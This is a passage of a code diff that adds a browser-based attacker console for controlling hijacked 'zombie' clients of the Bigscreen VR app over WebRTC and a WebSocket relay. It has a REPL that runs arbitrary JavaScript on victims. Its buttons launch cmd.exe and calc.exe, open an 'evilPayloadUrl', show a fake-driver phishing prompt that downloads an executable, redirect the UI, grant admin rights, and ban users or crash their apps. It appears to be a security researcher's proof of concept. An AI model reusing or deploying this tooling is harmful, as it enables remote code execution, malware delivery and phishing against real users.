+                console.assert(message.targetUser === this.attackerIdentity.userId, message.targetUser, this.attackerIdentity.userId);
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+                console.assert(message.targetDevice === 'desktop', message.targetDevice);
+                {
+                    if( ! this.roomParticipants[message.fromUser]){
+                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Answer.');
+                        return;
+                    }
+                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
+                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC SDP Answer.');
+                        return;
+                    }
+                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
+                    if (connection.isStarted) {
+                        connection.setRemoteDescription(new RTCSessionDescription(
+                            {
+                                type: message.type,
+                                sdp: message.value,
+                                scid: connection.scid,
+                                pcid: connection.pcid
+                            }));
+                    }
+                }
+                break;
+            default:
+                console.error('Unexpected message type (server to client):', message);
+                break;
+        }
+    };
+}
+
+function RoomUI(roomId, room){
+    let that = this;
+    this.room = room;
+    let roomCardTempalte = document.createElement('template');
+    roomCardTempalte.innerHTML =
+        '<div class="card my-3">\n' +
+        '    <div class="card-header">' +
+        '       <span class="roomId"></span>' +
+        '       <div class="dropdown display-inline-block">\n' +
+        '           <button class="btn btn-info dropdown-toggle" type="button" data-toggle="dropdown">' +
+        '               <b class="icon">⚙</b>' +
+        '               Settings' +
+        '           </button>\n' +
+        '           <div class="dropdown-menu">\n' +
+        '               <button class="_lockBigscreen dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock the big screen</b><br/>\n' +
+        '                   Avoid interruptions when watching movies on the big screen.<br/> Prevent users from changing the big screen.\n' +
+        '               </button>\n' +
+        '               <button class="_lockDesktopAudio dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock desktop audio streaming</b><br/>\n' +
+        '                   Prevent anyone from broadcasting a new Desktop Audio stream to the room.\n' +
+        '               </button>\n' +
+        '               <button class="_lockDrawing dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock 3D Drawing markers</b><br/>\n' +
+        '                   Prevent anyone from using 3D markers to draw in your room.\n' +
+        '               </button>\n' +
+        '           </div>\n' +
+        '       </div>' +
+        '       <button class="btn btn-danger _leave" type="button">' +
+        '           <b class="icon">👋</b>' +
+        '           Leave' +
+        '       </button>\n' +
+        '    </div>\n' +
+        '    <div class="card-body">\n' +
+        '        <div class="row">\n' +
+        '            <div class="col-6 col-sm-4">\n' +
+        '                <div class="card">\n' +
+        '                    <div class="card-header"><b class="icon">📧</b>Chat</div>\n' +
+        '                    <div class="card-body chat">\n' +
+        '                    </div>\n' +
+        '                </div>\n' +
+        '            </div>\n' +
+        '            <div class="col-6 col-sm-8">\n' +
+        '                <div class="row"></div>\n' +
+        '            </div>\n' +
+        '      </div>\n' +
+        '  </div>\n' +
+        '</div>';
+    this.roomCardElement = roomCardTempalte.content.firstChild;
+
+    this.lockElements = {
+        lockBigscreenButton: this.roomCardElement.querySelector('._lockBigscreen'),
+        lockDesktopAudioButton:  this.roomCardElement.querySelector('._lockDesktopAudio'),
+        lockDrawingButton: this.roomCardElement.querySelector('._lockDrawing'),
+    };
+    this.lockElements.lockBigscreenButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockBigscreen = ! locks.lockBigscreen;
+        that.room.updateLockSettings(locks);
+    });
+    this.lockElements.lockDesktopAudioButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockDesktopAudio = ! locks.lockDesktopAudio;
+        that.room.updateLockSettings(locks);
+    });
+    this.lockElements.lockDrawingButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockDrawing = ! locks.lockDrawing;
+        that.room.updateLockSettings(locks);
+    });
+
+    this.roomCardElement.querySelector('._leave').addEventListener("click", function (event) {
+        that.room.leave();
+        delete rooms[that.room.roomId];
+    });
+
+    this.roomIdElement = this.roomCardElement.querySelector('.card-header span.roomId');
+    this.roomIdElement.appendChild(document.createTextNode(roomId));
+
+    this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
+    this.participantsElement = this.roomCardElement.querySelector('div div div div.row');
+
+    this.updateLockSettings = function(locks){
+        if(locks.lockBigscreen) {
+            this.lockElements.lockBigscreenButton.classList.remove('bg-danger');
+            this.lockElements.lockBigscreenButton.classList.add('bg-success');
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockBigscreenButton.classList.add('bg-danger');
+            this.lockElements.lockBigscreenButton.classList.remove('bg-success');
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+
+        if(locks.lockDesktopAudio) {
+            this.lockElements.lockDesktopAudioButton.classList.remove('bg-danger');
+            this.lockElements.lockDesktopAudioButton.classList.add('bg-success');
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockDesktopAudioButton.classList.add('bg-danger');
+            this.lockElements.lockDesktopAudioButton.classList.remove('bg-success');
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+
+        if(locks.lockDrawing) {
+            this.lockElements.lockDrawingButton.classList.remove('bg-danger');
+            this.lockElements.lockDrawingButton.classList.add('bg-success');
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockDrawingButton.classList.add('bg-danger');
+            this.lockElements.lockDrawingButton.classList.remove('bg-success');
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+    };
+
+    this.render = function(parentElement){
+        parentElement.appendChild(this.roomCardElement);
+    };
+
+    this.hide = function(){
+        this.roomCardElement.parentNode.removeChild(this.roomCardElement);
+    };
+
+    this.renderChatMessage = function(message, sender, date){
+        let chatMessageTemplate = document.createElement('template');
+        chatMessageTemplate.innerHTML =
+            '<blockquote class="blockquote">\n' +
+            '    <p class="mb-0"></p>\n' +
+            '    <footer class="blockquote-footer"><cite title="Sender"></cite></footer>\n' +
+            '</blockquote>\n';
+        let chatMessageElement = chatMessageTemplate.content.firstChild;
+        chatMessageElement.querySelector('p').appendChild(document.createTextNode(message));
+        chatMessageElement.querySelector('footer cite').appendChild(document.createTextNode(sender));
+        chatMessageElement.querySelector('footer').appendChild(document.createTextNode(' at '+date));
+        this.chatBodyElement.appendChild(chatMessageElement);
+
+        this.chatBodyElement.scrollTop = this.chatBodyElement.scrollHeight;
+    }
+}
+
+/**
+ * Read–Eval–Print Loop (REPL) assigned to zombie
+ */
+function Repl(identity, formElement, inputElement, preElement){
+    this.identity = identity;
+    this.formElement = formElement;
+    this.inputElement = inputElement;
+    this.preElement = preElement;
+
+    this.renderCmd = function(cmd){
+        this.preElement.appendChild(document.createTextNode('≫ '+cmd+'\n'));
+        this.preElement.scrollTop = this.preElement.scrollHeight;
+    };
+
+    this.renderResult = function(result){
+        this.preElement.appendChild(document.createTextNode('← '+JSON.stringify(result)+'\n'));
+        this.preElement.scrollTop = this.preElement.scrollHeight;
+    };
+}
+
+/**
+ *  Connection between room participants using WebRTC.
+ */
+function Connection(scid, pcid, roomParticipant){
+    this.scid = scid;
+    this.pcid = pcid;
+    this.roomParticipant = roomParticipant;
+
+    this.isStarted = false;
+    this.isInitiator = false;
+    this.rtcPeerConnection = null;
+    this.remoteStream = null;
+
+    this.maybeStart = function () {
+        let that = this;
+        if (!that.isStarted) {
+            try {
+                that.rtcPeerConnection = new RTCPeerConnection(webRtcConfig);
+                that.rtcPeerConnection.onicecandidate = function (event) {
+                    console.log('icecandidate event: ', event);
+                    if (event.candidate) {
+                        that.roomParticipant.room.sendSignalingMessage({
+                            type: 'ice',
+                            roomId: that.roomParticipant.room.roomId,
+                            value: event.candidate.sdpMLineIndex + 'bigscreen_sdp_mline_index'
+                                + event.candidate.sdpMid + 'bigscreen_sdp_mid' + event.candidate.candidate,
+                            fromDevice: 'desktop',
+                            targetDevice: 'desktop',
+                            fromUser: that.roomParticipant.room.attackerIdentity.userId,
+                            targetUser: that.roomParticipant.userId,
+                            SCID: that.scid,
+                            PCID: that.pcid,
+                        });
+                    } else {
+                        console.log('End of candidates.');
+                    }
+                };
+                that.rtcPeerConnection.ontrack  = function (event) {
+                    console.log('Remote streams added.');
+                    console.log(event.streams);
+                    that.remoteStream = event.streams[0];
+                    if(that.pcid === 0){
+                        that.roomParticipant.videoElement.srcObject = event.streams[0];
+                    }
+                    else{
+                        that.roomParticipant.audioElement.srcObject = event.streams[0];
+                    }
+                };
+                that.rtcPeerConnection.onremovestream = function (event) {
+                    console.log('Remote stream removed. Event: ', event);
+                };
+
+                console.log('Created RTCPeerConnnection');
+            } catch (e) {
+                console.log('Failed to create PeerConnection, exception: ' + e.message);
+                alert('Cannot create RTCPeerConnection object.');
+                return;
+            }
+            if (that.isInitiator){
+                dataChannelSend = that.rtcPeerConnection.createDataChannel('__FOOBAR_DATA_CHANNEL_NAME_DIRECT__');
+                dataChannelSend.onopen = that.onSendChannelStateChangeDirect;
+                dataChannelSend.onclose = that.onSendChannelStateChangeDirect;
+            }
+            else{
+                /*
+                that.rtcPeerConnection.ondatachannel = function(event) {
+                    console.log('Receive Channel Callback');
+                    dataChannelReceive = event.channel;
+                    dataChannelReceive.onmessage = function(event){
+                        console.error('Received Message', connection, event.data);
+                    };
+                    dataChannelReceive.onopen = that.onReceiveChannelStateChangeDirect;
+                    dataChannelReceive.onclose = that.onReceiveChannelStateChangeDirect;
+                };
+                */
+            }
+
+            that.isStarted = true;
+            console.log('connection.isInitiator', that.isInitiator);
+            if (that.isInitiator) {
+                console.log('Sending offer to peer');
+                that.rtcPeerConnection.createOffer(offerOptions).then(
+                    function(sdp){that.setLocalAndSendMessage(sdp, that)}, that.handleCreateOfferError);
+            }
+        }
+    };
+
+    this.onSendChannelStateChangeDirect = function() {
+      const readyState = dataChannelSend.readyState;
+      console.log('dataChannelSend Send channel state is: ' + readyState);
+    };
+
+    this.onReceiveChannelStateChangeDirect = function() {
+      const readyState = dataChannelReceive.readyState;
+      console.log(`receiveDataChannelDirect Receive channel state is: ${readyState}`);
+    };
+
+    this.handleCreateOfferError = function(event) {
+        console.log('createOffer() error: ', event);
+    };
+
+    this.setLocalAndSendMessage = function(sessionDescription) {
+        this.rtcPeerConnection.setLocalDescription(sessionDescription);
+        let sessionDescriptionMessage = {
+            type: sessionDescription.type,
+            roomId: this.roomParticipant.room.roomId,
+            value: sessionDescription.sdp,
+            fromDevice: 'desktop',
+            targetDevice: 'desktop',
+            fromUser: this.roomParticipant.room.attackerIdentity.userId,
+            targetUser: this.roomParticipant.userId,
+            SCID: this.scid,
+            PCID: this.pcid,
+        };
+        console.log('setLocalAndSendMessage sending message', sessionDescriptionMessage);
+        this.roomParticipant.room.sendSignalingMessage(sessionDescriptionMessage);
+    };
+
+    this.doAnswer = function() {
+        let that = this;
+        console.log('Sending answer to peer.');
+        this.rtcPeerConnection.createAnswer().then(
+            function(sdp){that.setLocalAndSendMessage(sdp, that)},
+            that.onCreateSessionDescriptionError
+        );
+    };
+
+    this.onCreateSessionDescriptionError = function(error) {
+        console.log('Failed to create session description: ' + error.toString());
+    };
+
+    this.close = function(){
+        if(this.rtcPeerConnection){
+            this.rtcPeerConnection.close();
+        }
+    };
+}
+
+function Identity(name, uuid, steamId){
+    this.name = name;
+    this.uuid = uuid;
+    this.steamId = steamId;
+
+    this.userId = null;
+}
+
+function RoomParticipant(identity, room, userId){
+    let that = this;
+    this.identity = identity;
+    this.room = room;
+    this.userId = userId;
+    /** Connection objects indexed by PCID */
+    this.connections = {};
+
+    //region UI
+    let template = document.createElement('template');
+    template.innerHTML = '<div class="col-sm-6">\n' +
+        '           <div class="card">\n' +
+        '              <video class="card-img-top" autoplay playsinline controls></video>\n' +
+        '              <audio class="card-img-top" autoplay controls></audio>\n' +
+        '              <div class="card-body">\n' +
+        '                <h5 class="_username card-title"></h5>\n' +
+        '                <h6 class="_userId card-subtitle mb-2 text-muted"></h6>\n' +
+        '                <h6 class="_uuid card-subtitle mb-2 text-muted"></h6>\n' +
+        '                <p class="card-text"></p>\n' +
+        '                <div class="btn-group" role="group">\n' +
+        '                <div class="btn-group">\n' +
+        '                    <button class="btn btn-primary dropdown-toggle" type="button" data-toggle="dropdown">\n' +
+        '                        <b class="icon">🤖</b>\n' +
+        '                        Control\n' +
+        '                    </button>\n' +
+        '                    <div class="dropdown-menu zombie-control-menu">\n' +
+        '                        <form class="_openURL m-1">\n' +
+        '                            <input type="text" name="openURL" class="form-control" value="'+evilPayloadUrl+'"placeholder="http://example.com/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open URL</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_openPath m-1">\n' +
+        '                            <input type="text" name="openPath" class="form-control" value="C:/Users/" placeholder="C:/Users/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open path</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_fakeDriver m-1">\n' +
+        '                            <input type="text" name="fakeDriver" class="form-control" value="'+fakeDriverUrl+'" placeholder="http://example.com/driver.exe">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Fake driver phishing</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_redirectUI m-1">\n' +
+        '                            <input type="text" name="redirectUI" class="form-control" placeholder="http://example.com/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Redirect UI</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_sendChat m-1">\n' +
+        '                            <input type="text" name="sendChat" class="form-control" placeholder="chat message">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Send chat</button>\n' +
+        '                        </form>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_toggleVideo dropdown-item" type="button">Toggle video</button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_setAdmin dropdown-item" type="button">Grant admin privileges</button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_runCalc dropdown-item" type="button">Run <code>calc.exe</code></button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_runCmd dropdown-item" type="button">Run <code>cmd.exe</code></button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_openScreenshotDirectory dropdown-item" type="button">Open screenshot directory</button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_playSoundEffects dropdown-item" type="button">Play sound effects</button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_randomizeAvatar dropdown-item" type="button">Randomize avatar</button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_banUser dropdown-item" type="button">Ban until restart</button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_exitApp dropdown-item" type="button">Kill Bigscreen app</button>\n' +
+        '                    </div>\n' +
+        '                </div>' +
+        '                <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#repl'+this.room.roomId+this.userId+'">' +
+        '                   <b class="icon">📡</b>' +
+        '                   REPL</button>\n' +
+        '                <button class="_kick btn btn-danger" type="button" >' +
+        '                   <b class="icon">👋</b>' +
+        '                   Kick' +
+        '                </button>\n' +
+        '                </div>\n' +
+        '                <div class="collapse" id="repl'+this.room.roomId+this.userId+'">\n' +
+        '                    <div class="card card-body p-0">\n' +
+        '                    <pre class="repl"></pre>\n' +
+        '                    <form class="_repl">\n' +
+        '                        <div class="input-group">\n' +
+        '                            <div class="input-group-prepend">\n' +
+        '                                <span class="input-group-text">&Gt;</span>\n' +
+        '                            </div>\n' +
+        '                            <input type="text" name="repl" class="form-control" >\n' +
+        '                            <div class="input-group-append">\n' +
+        '                                <input class="btn btn-outline-danger" type="submit" value="Execute">\n' +
+        '                            </div>\n' +
+        '                        </div>\n' +
+        '                    </form>\n' +
+        '                    </div>\n' +
+        '                </div>\n' +
+        '              </div>\n' +
+        '            </div>\n' +
+        '        </div>';
+    let cardElement = template.content.firstChild;
+    this.cardElement = cardElement;
+    this.videoElement = cardElement.getElementsByTagName('video')[0];
+    this.audioElement = cardElement.getElementsByTagName('audio')[0];
+    roomRepls[this.identity.uuid] = new Repl(
+        this.identity,
+        cardElement.getElementsByClassName('_repl')[0],
+        cardElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0],
+        cardElement.getElementsByTagName('pre')[0],
+    );
+    cardElement.getElementsByClassName('_username')[0].appendChild(document.createTextNode(removePayloadFromName(this.identity.name)));
+    cardElement.getElementsByClassName('_userId')[0].appendChild(document.createTextNode('UserID: '+this.userId));
+    cardElement.getElementsByClassName('_uuid')[0].appendChild(document.createTextNode('UUID: '+this.identity.uuid));
+
+    this.kickButton = cardElement.getElementsByClassName('_kick')[0];
+    this.kickButton.addEventListener("click", function (event) {
+        that.room.kickParticipant(that.userId);
+    });
+    cardElement.getElementsByClassName('_setAdmin')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.identity.uuid, 'setMyUserAdmin();');
+    });
+    cardElement.getElementsByClassName('_toggleVideo')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.identity.uuid, "toggleMyVideo();");
+    });
+    cardElement.getElementsByClassName('_runCalc')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.identity.uuid, "openLink('calc');");
+    });
+    cardElement.getElementsByClassName('_runCmd')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.identity.uuid, "openLink('cmd');");
+    });
+    cardElement.getElementsByClassName('_openScreenshotDirectory')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.identity.uuid, "Unity.openScreenshotDirectory();");
+    });
+    cardElement.getElementsByClassName('_randomizeAvatar')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.identity.uuid, "Unity.randomizeAvatar();");
+    });
+    cardElement.getElementsByClassName('_banUser')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.identity.uuid, "checkBlacklist = function (a) {localStorage['banned'] = true; localStorage['banreason'] = 'Banned by attacker.';sendAccountToUI();};checkBlacklist();userWantsToLeaveRoom();");
+    });
+    cardElement.getElementsByClassName('_exitApp')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.identity.uuid, "exitApp();");
+    });
+    cardElement.getElementsByClassName('_playSoundEffects')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.identity.uuid,`
+            var _se=["ui_select_1","ui_select_2","ui_select_3","ui_select_4","ui_select_5","ui_pause","ui_error_1","ui_error_2","ui_error_3","ui_error_4","ui_error_5","CAMERA-SLR- SHUTTER","Corked","Bing Bong"];
+            var _i = 0;
+            var _id;
+            function _f(){if(_i<_se.length){Unity.playSoundEffect(_se[_i]);_i++;}else{clearInterval(_id)}};
+            _id = setInterval(_f, 200);
+        `);
+    });
+
+    cardElement.getElementsByClassName('_sendChat')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_sendChat')[0].getElementsByTagName('input')[0];
+        let msg = input.value;
+        input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `displayChatMessage('${msg}', USER); Unity.sendMessageToBrowsers('chat',['${msg}'], USER, 'all'); var s=new WebSocket('${relayWebSocketServerUrl}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,message:'${msg}'}));s.close();}`
+        );
+    });
+    cardElement.getElementsByClassName('_openURL')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_openURL')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `openLink('${url}');;`
+        );
+    });
+    cardElement.getElementsByClassName('_openPath')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_openPath')[0].getElementsByTagName('input')[0];
+        let path = input.value;
+        // do not clear this form, user might want to use the default path multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `openLink('${path}');;`
+        );
+    });
+    cardElement.getElementsByClassName('_fakeDriver')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_fakeDriver')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `setErrorWarningText("Sorry! Additional VR driver is required.<br/>Please download and install driver.");$("#error-occurred .modal-footer button").click(function(){ openLink('${url}'); });showErrorPrompt()`
+        );
+    });
+    cardElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `window.location.replace('${url}');`
+        );
+    });
+
+    this.render = function(){
+        room.roomUI.participantsElement.appendChild(this.cardElement);
+    };
+
+    this.hide = function(){
+        this.cardElement.parentNode.removeChild(this.cardElement);
+    };
+    //endregion
+
+    this.closeConnections = function(){
+        console.debug(`Closing all connections of participant ${this.userId} in room ${this.room.roomId}.`);
+        for (let pcid in this.connections){
+            if(this.connections.hasOwnProperty(pcid)){
+                this.connections[pcid].close();
+            }
+        }
+    }
+}
+
+function Zombie(uuid, steamId, oculusId, name){
+    let that = this;
+    this.uuid = uuid;
+    this.steamId = steamId;
+    this.oculusId = oculusId;
+    this.name = name;
+
+    this.repls = [];
+
+    this.zombieUI = null;
+    this.zombieControlUI = null;
+
+    this.receivedPong = false;
+    this.ping = function(){
+        this.receivedPong = false;
+        messageRelayWs.send(JSON.stringify({
+            type: "zombie-ping",
+            uuid: that.uuid,
+        }));
+    };
+}
+
+function ZombieUI(zombie){
+    this.zombieElement = document.createElement('a');
+    this.zombieElement.setAttribute('href', '#');
+    this.zombieElement.classList.add('list-group-item-warning');
+    this.zombieElement.classList.add('list-group-item');
+    this.zombieElement.classList.add('list-group-item-action');
+    this.zombieElement.appendChild(document.createTextNode(removePayloadFromName(zombie.name)));
+
+    this.render = function(parent) {
+        parent.appendChild(this.zombieElement);
+    };
+    this.hide = function(){
+        this.zombieElement.parentNode.removeChild(this.zombieElement);
+    };
+}
+
+function ZombieControlUI(zombie){
+    let that = this;
+    this.zombie = zombie;
+    let controlTemplate = document.createElement('template');
+    controlTemplate.innerHTML =
+        '<div class="collapse col-12 my-3 zombieControl" id="zombieControl-'+zombie.uuid+'">\n' +
+        '    <div class="card">\n' +
+        '        <div class="card-header">\n' +
+        '            <b>' + removePayloadFromName(zombie.name) + '</b>\n' +
+        '            ' + zombie.uuid + '\n' +
+        '            <button type="button" class="close" data-toggle="collapse" data-target="#zombieControl-'+zombie.uuid+'">\n' +
+        '              <span>&times;</span>\n' +
+        '            </button>' +
+        '            <ul class="nav nav-tabs card-header-tabs">\n' +
+        '                <li class="nav-item dropdown">\n' +
+        '                    <button class="nav-link dropdown-toggle" data-toggle="dropdown">\n' +
+        '                        <b class="icon">🤖</b> Control\n' +
+        '                    </button>\n' +
+        '                    <div class="dropdown-menu zombie-control-menu">\n' +
+        '                        <form class="_openURL m-1">\n' +
+        '                            <input type="text" name="openURL" class="form-control" value="'+evilPayloadUrl+'"placeholder="http://example.com/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open URL</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_openPath m-1">\n' +
+        '                            <input type="text" name="openPath" class="form-control" value="C:/Users/" placeholder="C:/Users/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open path</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_fakeDriver m-1">\n' +
+        '                            <input type="text" name="fakeDriver" class="form-control" value="'+fakeDriverUrl+'" placeholder="http://example.com/driver.exe">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Fake driver phishing</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_redirectUI m-1">\n' +
+        '                             <input type="text" name="redirectUI" class="form-control" placeholder="http://example.com/">\n' +
+        '                             <button type="submit" class="btn btn-block btn-primary">Redirect UI</button>\n' +
+        '                         </form>\n' +
+        '                         <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_toggleVideo dropdown-item" type="button">Toggle video</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_runCalc dropdown-item" type="button">Run <code>calc.exe</code></button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_runCmd dropdown-item" type="button">Run <code>cmd.exe</code></button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_openScreenshotDirectory dropdown-item" type="button">Open screenshot directory</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_playSoundEffects dropdown-item" type="button">Play sound effects</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_randomizeAvatar dropdown-item" type="button">Randomize avatar</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_exitApp dropdown-item" type="button">Kill Bigscreen app</button>\n' +
+        '                    </div>\n' +
+        '                </li>\n' +
+        '                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#chat' + zombie.uuid + '"><b class="icon">📧</b> Chat</a></li>\n' +
+        '                <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#logs' + zombie.uuid + '"><b class="icon">📜</b> Logs</a></li>\n' +
+        '                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#repl' + zombie.uuid + '"><b class="icon">📡</b> REPL</a></li>\n' +
+        '            </ul>\n' +
+        '        </div>\n' +
+        '        <div class="tab-content" >\n' +
+        '            <div class="tab-pane fade zombie-chat" id="chat' + zombie.uuid + '">' +
+        '<div class="card-body"></div>' + // NOTE: not indented to prevend text node with `\n                ` here.
+        '</div>\n' + // NOTE: not indented to prevend text node with `\n                ` here.
+        '            <div class="tab-pane fade zombie-logs show active" id="logs' + zombie.uuid + '">' +
+        '<div class="card-body"></div>' + // NOTE: not indented to prevend text node with `\n                ` here.
+        '</div>\n' + // NOTE: not indented to prevend text node with `\n                ` here.
+        '            <div class="tab-pane fade zombie-repl" id="repl' + zombie.uuid + '">\n' +
+        '                <pre></pre>\n' +
+        '                <form class="_repl">\n' +
+        '                    <div class="input-group">\n' +
+        '                        <div class="input-group-prepend">\n' +
+        '                            <span class="input-group-text">&Gt;</span>\n' +
+        '                        </div>\n' +
+        '                        <input type="text" name="repl" class="form-control" >\n' +
+        '                        <div class="input-group-append">\n' +
+        '                            <input class="btn btn-outline-danger" type="submit" value="Execute">\n' +
+        '                        </div>\n' +
+        '                    </div>\n' +
+        '                </form>\n' +
+        '            </div>\n' +
+        '        </div>\n' +
+        '    </div>\n' +
+        '</div>';
+    this.controlElement = controlTemplate.content.firstChild;
+    this.chatElement = this.controlElement.querySelector('div.zombie-chat div.card-body');
+    this.logsElement = this.controlElement.querySelector('div.zombie-logs div.card-body');
+
+    this.replFormInputElement = that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0];
+    this.replFormSubmitElement = that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[1];
+    this.zombie.repls.push(new Repl(
+        that.zombie, // TODO: Would be better to use Identity here.
+        that.controlElement.getElementsByClassName('_repl')[0],
+        this.replFormInputElement,
+        that.controlElement.getElementsByTagName('pre')[0],
+    ));
+
+    this.controlElement.getElementsByClassName('_toggleVideo')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.zombie.uuid, "toggleMyVideo();");
+    });
+    this.controlElement.getElementsByClassName('_runCalc')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.zombie.uuid, "openLink('calc');");
+    });
+    this.controlElement.getElementsByClassName('_runCmd')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.zombie.uuid, "openLink('cmd');");
+    });
+    this.controlElement.getElementsByClassName('_openScreenshotDirectory')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.zombie.uuid, "Unity.openScreenshotDirectory();");
+    });
+    this.controlElement.getElementsByClassName('_randomizeAvatar')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.zombie.uuid, "Unity.randomizeAvatar();");
+    });
+    this.controlElement.getElementsByClassName('_exitApp')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.zombie.uuid, "exitApp();");
+    });
+    this.controlElement.getElementsByClassName('_playSoundEffects')[0].addEventListener("click", function(event) {
